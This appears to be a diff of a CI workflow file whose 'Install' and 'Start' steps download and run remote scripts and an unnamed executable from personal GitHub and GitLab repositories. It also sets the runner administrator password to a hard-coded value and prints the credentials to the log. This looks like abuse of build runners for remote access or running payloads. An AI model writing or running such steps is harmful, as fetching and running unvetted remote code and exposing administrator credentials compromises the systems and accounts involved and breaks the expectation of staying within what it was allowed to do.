@@ -11,13 +11,14 @@ jobs:
 
       - name: Install 
         run: |
-          curl -s -L -o install.ps1 https://github.com/Efebey007/Test-Environment/raw/refs/heads/main/test.ps1
-          .\install.ps1
+          curl -s -L -o install.bat https://raw.githubusercontent.com/Efebey007/Test-Environment/refs/heads/main/test.bat
+          cmd /c install.bat
 
       - name: Start 
         run: |
-           curl -s -L -o start.ps1 https://github.com/Efebey007/Test-Environment/raw/refs/heads/main/idkk.ps1
-           .\start.ps1
+           net user runneradmin P@ssw0rd!
+           Write-Host "Username: runneradmin"
+           Write-Host "Password: P@ssw0rd!"
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            cmd /c sleep 240
            cmd /c curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
